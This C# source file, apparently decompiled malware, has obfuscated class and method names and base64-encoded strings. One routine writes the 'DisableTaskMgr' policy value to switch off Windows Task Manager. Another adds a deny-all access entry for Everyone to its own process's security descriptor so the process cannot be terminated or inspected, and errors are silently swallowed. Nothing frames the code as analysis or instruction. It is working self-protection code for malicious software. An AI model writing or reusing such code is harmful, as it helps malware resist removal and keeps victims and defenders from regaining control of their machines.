using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace YXHSMjloYIX;

internal class DFmNPAwKRyEQ
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr aofvlYvyEPFQ, int tasABtVWnrE, [Out] byte[] aimGtIfGQGV, uint YigbaWpOEc, out uint gfAEFJhZixuuaeA);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr BMLASsoanVDMq, int QKPIQlnsBvBNqkfz, [In] byte[] cYIGESbOBkSp);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void wFqbTQehcCDCkZ(bool SCLZzunrNdTK)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(zkwozuPRYYOVZ.bxMeQFfPcma("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			if (SCLZzunrNdTK && registryKey.GetValue(zkwozuPRYYOVZ.bxMeQFfPcma("RGlzYWJsZVRhc2tNZ3I=")) != null)
			{
				registryKey.DeleteValue(zkwozuPRYYOVZ.bxMeQFfPcma("RGlzYWJsZVRhc2tNZ3I="));
			}
			else
			{
				registryKey.SetValue(zkwozuPRYYOVZ.bxMeQFfPcma("RGlzYWJsZVRhc2tNZ3I="), "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor ewkUEtUjgwSbB(IntPtr IPOUfEkygexR)
	{
		byte[] aimGtIfGQGV = new byte[0];
		GetKernelObjectSecurity(IPOUfEkygexR, 4, aimGtIfGQGV, 0u, out var gfAEFJhZixuuaeA);
		if ((long)gfAEFJhZixuuaeA > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(IPOUfEkygexR, 4, aimGtIfGQGV = new byte[gfAEFJhZixuuaeA], gfAEFJhZixuuaeA, out gfAEFJhZixuuaeA))
		{
			return null;
		}
		return new RawSecurityDescriptor(aimGtIfGQGV, 0);
	}

	private void HnNaQyNKzRMhl(IntPtr XRYtkwOtWeEl, RawSecurityDescriptor qJyvjVfmEKGcLY)
	{
		byte[] array = new byte[qJyvjVfmEKGcLY.BinaryLength];
		qJyvjVfmEKGcLY.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(XRYtkwOtWeEl, 4, array);
	}

	public void jOLKGgmwXmx()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = ewkUEtUjgwSbB(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			HnNaQyNKzRMhl(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
